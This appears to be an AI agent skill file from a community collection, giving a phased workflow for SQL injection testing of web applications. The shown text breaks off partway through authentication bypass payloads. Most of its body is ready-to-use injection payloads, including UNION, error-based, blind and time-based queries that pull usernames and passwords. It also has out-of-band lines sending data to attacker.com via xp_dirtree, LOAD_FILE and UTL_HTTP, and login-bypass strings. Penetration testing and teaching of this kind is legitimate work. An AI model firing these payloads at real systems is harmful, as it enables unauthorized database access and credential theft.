     1|---
     2|name: ag-sql-injection-testing
     3|description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techni"
     4|version: 1.0.0
     5|tags: [antigravity, security]
     6|category: software-development
     7|source: https://github.com/sickn33/antigravity-awesome-skills
     8|---
     9|
    10|---
    11|name: sql-injection-testing
    12|description: "Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms."
    13|risk: offensive
    14|source: community
    15|author: zebbern
    16|date_added: "2026-02-27"
    17|---
    18|
    19|> AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
    20|
    21|# SQL Injection Testing
    22|
    23|## Purpose
    24|
    25|Execute comprehensive SQL injection vulnerability assessments on web applications to identify database security flaws, demonstrate exploitation techniques, and validate input sanitization mechanisms. This skill enables systematic detection and exploitation of SQL injection vulnerabilities across in-band, blind, and out-of-band attack vectors to assess application security posture.
    26|
    27|## Inputs / Prerequisites
    28|
    29|### Required Access
    30|- Target web application URL with injectable parameters
    31|- Burp Suite or equivalent proxy tool for request manipulation
    32|- SQLMap installation for automated exploitation
    33|- Browser with developer tools enabled
    34|
    35|### Technical Requirements
    36|- Understanding of SQL query syntax (MySQL, MSSQL, PostgreSQL, Oracle)
    37|- Knowledge of HTTP request/response cycle
    38|- Familiarity with database schemas and structures
    39|- Write permissions for testing reports
    40|
    41|### Legal Prerequisites
    42|- Written authorization for penetration testing
    43|- Defined scope including target URLs and parameters
    44|- Emergency contact procedures established
    45|- Data handling agreements in place
    46|
    47|## Outputs / Deliverables
    48|
    49|### Primary Outputs
    50|- SQL injection vulnerability report with severity ratings
    51|- Extracted database schemas and table structures
    52|- Authentication bypass proof-of-concept demonstrations
    53|- Remediation recommendations with code examples
    54|
    55|### Evidence Artifacts
    56|- Screenshots of successful injections
    57|- HTTP request/response logs
    58|- Database dumps (sanitized)
    59|- Payload documentation
    60|
    61|## Core Workflow
    62|
    63|### Phase 1: Detection and Reconnaissance
    64|
    65|#### Identify Injectable Parameters
    66|Locate user-controlled input fields that interact with database queries:
    67|
    68|```
    69|# Common injection points
    70|- URL parameters: ?id=1, ?user=admin, ?category=books
    71|- Form fields: username, password, search, comments
    72|- Cookie values: session_id, user_preference
    73|- HTTP headers: User-Agent, Referer, X-Forwarded-For
    74|```
    75|
    76|#### Test for Basic Vulnerability Indicators
    77|Insert special characters to trigger error responses:
    78|
    79|```sql
    80|-- Single quote test
    81|'
    82|
    83|-- Double quote test
    84|"
    85|
    86|-- Comment sequences
    87|--
    88|#
    89|/**/
    90|
    91|-- Semicolon for query stacking
    92|;
    93|
    94|-- Parentheses
    95|)
    96|```
    97|
    98|Monitor application responses for:
    99|- Database error messages revealing query structure
   100|- Unexpected application behavior changes
   101|- HTTP 500 Internal Server errors
   102|- Modified response content or length
   103|
   104|#### Logic Testing Payloads
   105|Verify boolean-based vulnerability presence:
   106|
   107|```sql
   108|-- True condition tests
   109|page.asp?id=1 or 1=1
   110|page.asp?id=1' or 1=1--
   111|page.asp?id=1" or 1=1--
   112|
   113|-- False condition tests  
   114|page.asp?id=1 and 1=2
   115|page.asp?id=1' and 1=2--
   116|```
   117|
   118|Compare responses between true and false conditions to confirm injection capability.
   119|
   120|### Phase 2: Exploitation Techniques
   121|
   122|#### UNION-Based Extraction
   123|Combine attacker-controlled SELECT statements with original query:
   124|
   125|```sql
   126|-- Determine column count
   127|ORDER BY 1--
   128|ORDER BY 2--
   129|ORDER BY 3--
   130|-- Continue until error occurs
   131|
   132|-- Find displayable columns
   133|UNION SELECT NULL,NULL,NULL--
   134|UNION SELECT 'a',NULL,NULL--
   135|UNION SELECT NULL,'a',NULL--
   136|
   137|-- Extract data
   138|UNION SELECT username,password,NULL FROM users--
   139|UNION SELECT table_name,NULL,NULL FROM information_schema.tables--
   140|UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
   141|```
   142|
   143|#### Error-Based Extraction
   144|Force database errors that leak information:
   145|
   146|```sql
   147|-- MSSQL version extraction
   148|1' AND 1=CONVERT(int,(SELECT @@version))--
   149|
   150|-- MySQL extraction via XPATH
   151|1' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
   152|
   153|-- PostgreSQL cast errors
   154|1' AND 1=CAST((SELECT version()) AS int)--
   155|```
   156|
   157|#### Blind Boolean-Based Extraction
   158|Infer data through application behavior changes:
   159|
   160|```sql
   161|-- Character extraction
   162|1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
   163|1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='b'--
   164|
   165|-- Conditional responses
   166|1' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0--
   167|```
   168|
   169|#### Time-Based Blind Extraction
   170|Use database sleep functions for confirmation:
   171|
   172|```sql
   173|-- MySQL
   174|1' AND IF(1=1,SLEEP(5),0)--
   175|1' AND IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a',SLEEP(5),0)--
   176|
   177|-- MSSQL
   178|1'; WAITFOR DELAY '0:0:5'--
   179|
   180|-- PostgreSQL
   181|1'; SELECT pg_sleep(5)--
   182|```
   183|
   184|#### Out-of-Band (OOB) Extraction
   185|Exfiltrate data through external channels:
   186|
   187|```sql
   188|-- MSSQL DNS exfiltration
   189|1; EXEC master..xp_dirtree '\\attacker-server.com\share'--
   190|
   191|-- MySQL DNS exfiltration
   192|1' UNION SELECT LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\a'))--
   193|
   194|-- Oracle HTTP request
   195|1' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual)) FROM dual--
   196|```
   197|
   198|### Phase 3: Authentication Bypass
   199|
   200|#### Login Form Exploitation
   201|Craft payloads to bypass credential verification:
   202|
   203|```sql
   204|-- Classic bypass
   205|admin'--
   206|admin'/*
   207|' OR '1'='1
   208|' OR '1'='1'--
   209|' OR '1'='1'/*
   210|